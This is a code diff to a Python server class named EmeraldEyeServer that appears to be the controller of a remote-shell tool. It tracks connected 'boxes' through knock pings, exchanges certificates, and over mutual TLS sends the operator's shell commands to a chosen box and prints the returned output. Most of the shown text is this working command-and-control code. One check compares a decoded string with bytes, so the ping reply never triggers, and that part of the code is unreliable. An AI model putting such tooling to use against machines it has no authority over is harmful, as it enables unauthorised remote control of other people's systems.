@@ -14,6 +14,8 @@ class EmeraldEyeServer():
     def __init__(self, host):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.sock.bind((host, TLS_PORT))
+        self.sock.listen(15)
         self.knock_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.knock_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.host = host
@@ -51,23 +53,26 @@ class EmeraldEyeServer():
             con, addy = self.knock_sock.accept()
             con.settimeout(10)
             self.ping_threads[addy] = con
-            threading.Thread(target=self.handle_health, args=(con,)).start()
+            threading.Thread(target=self.handle_health, args=(con, addy)).start()
             
     
-    def handle_health(self, con):
+    def handle_health(self, con, addy):
         while True:
             try:
                 temp = con.recv(1024).decode()
+                if temp == b'Knock':
+                    con.send(b'Knock')
             except Exception as e:
-                pass
-            if temp == b'Knock':
-                con.send(b'Knock')
+                if addy in self.ping_threads:
+                    del self.ping_threads[addy]
+                
+            
     
     def send_start(self, addy):
         crt = b''
+        con = self.ping_threads[addy]
         while crt == b'':
             try:
-                con = self.ping_threads[addy]
                 con.sendall(b'crt-'+self.my_crt)
                 print("Cert Sent")
                 con.settimeout(5)
@@ -89,8 +94,6 @@ class EmeraldEyeServer():
         context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=self.tls_other_crt_file)
         context.verify_mode = ssl.CERT_REQUIRED
         context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
-        self.sock.bind((self.host, TLS_PORT))
-        self.sock.listen(5)
         new_sock, addy = self.sock.accept()
         con = context.wrap_socket(new_sock, server_side=True)
         buff = ""
@@ -108,22 +111,24 @@ class EmeraldEyeServer():
                 break
             command += "\n"
             con.send(command.encode())
-            x = 3 if all(s not in command for s in ["cd", "exit()"]) else 2
             count = 0
-            while count != x:
-                buff = ""
-                while "-emrdeye" not in buff:
-                    try:
-                        tmp = con.recv(1024).decode()
-                        buff += tmp           
-                    except Exception as e:
-                        print(e)
-                        pass
-                buff = buff.split("-emrdeye")[0]
-                if buff.strip():
-                    if count != 0:
-                        print(buff, end="")
-                    count += 1
+            while True:
+                try:
+                    buff = ""
+                    while "-emrdeye" not in buff:
+                        try:
+                            con.settimeout(0.2)
+                            tmp = con.recv(1024).decode()
+                            buff += tmp           
+                        except Exception as e:
+                            raise e
+                    buff = buff.split("-emrdeye")[0]
+                    if buff.strip():
+                        if count != 0:
+                            print(buff, end="")
+                        count += 1
+                except Exception as e:
+                    break
         con.close()
 
 def main():
@@ -139,6 +144,7 @@ def main():
             print(str(c) + ". " + str(s))
             keys.append(s)
             c += 1
+        print("\n\n\n")
         if select == "1":
             if len(t.ping_threads) > 0:
                 num = input("Number of box you want to connect to:")
